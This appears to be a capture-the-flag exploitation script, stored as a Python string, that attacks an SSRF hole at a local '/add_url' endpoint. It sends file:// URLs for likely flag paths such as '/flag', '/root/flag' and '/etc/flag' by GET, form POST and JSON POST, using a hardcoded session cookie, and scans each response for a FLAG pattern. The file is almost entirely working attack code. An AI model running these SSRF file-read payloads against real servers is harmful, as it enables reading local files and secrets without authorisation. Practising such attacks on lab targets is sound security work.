#!/usr/bin/env python3
"""
SSRF File Protocol Exploitation Test Script
Target: http://127.0.0.1:5003/add_url

This script tests SSRF vulnerabilities using the file:// protocol
to attempt local file reads through the server.
"""

script_content = '''
import requests
import re
import json

# Configuration
BASE_URL = "http://127.0.0.1:5003"
ENDPOINT = "/add_url"
SESSION_COOKIE = "eyJfZnJlc2giOmZhbHNlfQ.aVpTCA.s-VGf6vmfbtBjEeQRdAqLSxxbxE"

cookies = {'session': SESSION_COOKIE}
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

file_paths = [
    "file:///flag",
    "file:///flag.txt", 
    "file:///app/flag",
    "file:///app/flag.txt",
    "file:///tmp/flag",
    "file:///root/flag",
    "file:///etc/flag"
]

print("=" * 80)
print("SSRF FILE PROTOCOL EXPLOITATION TEST")
print("=" * 80)

# Test Method 1: GET with query parameter
print("\\n[METHOD 1] GET with query parameter")
print("-" * 80)
for path in file_paths:
    print(f"\\n[+] GET {ENDPOINT}?url={path}")
    try:
        r = requests.get(f"{BASE_URL}{ENDPOINT}", params={'url': path}, 
                        cookies=cookies, headers=headers, timeout=10)
        print(f"Status: {r.status_code} | Length: {len(r.text)}B")
        print(f"Response: {r.text}")
        
        if re.search(r'FLAG\\{[^}]+\\}', r.text):
            print("[!!!] FLAG PATTERN DETECTED")
    except Exception as e:
        print(f"Error: {e}")

# Test Method 2: POST with form data
print("\\n[METHOD 2] POST with form data")
print("-" * 80)
for path in file_paths:
    print(f"\\n[+] POST {ENDPOINT} data={{url: {path}}}")
    try:
        r = requests.post(f"{BASE_URL}{ENDPOINT}", data={'url': path},
                         cookies=cookies, headers=headers, timeout=10)
        print(f"Status: {r.status_code} | Length: {len(r.text)}B")
        print(f"Response: {r.text}")
        
        if re.search(r'FLAG\\{[^}]+\\}', r.text):
            print("[!!!] FLAG PATTERN DETECTED")
    except Exception as e:
        print(f"Error: {e}")

# Test Method 3: POST with JSON
print("\\n[METHOD 3] POST with JSON")
print("-" * 80)
json_headers = headers.copy()
json_headers['Content-Type'] = 'application/json'

for path in file_paths:
    print(f"\\n[+] POST {ENDPOINT} JSON={{url: {path}}}")
    try:
        r = requests.post(f"{BASE_URL}{ENDPOINT}", json={'url': path},
                         cookies=cookies, headers=json_headers, timeout=10)
        print(f"Status: {r.status_code} | Length: {len(r.text)}B")
        print(f"Response: {r.text}")
        
        if re.search(r'FLAG\\{[^}]+\\}', r.text):
            print("[!!!] FLAG PATTERN DETECTED")
    except Exception as e:
        print(f"Error: {e}")

print("\\n" + "=" * 80)
print("TEST COMPLETE")
print("=" * 80)
'''

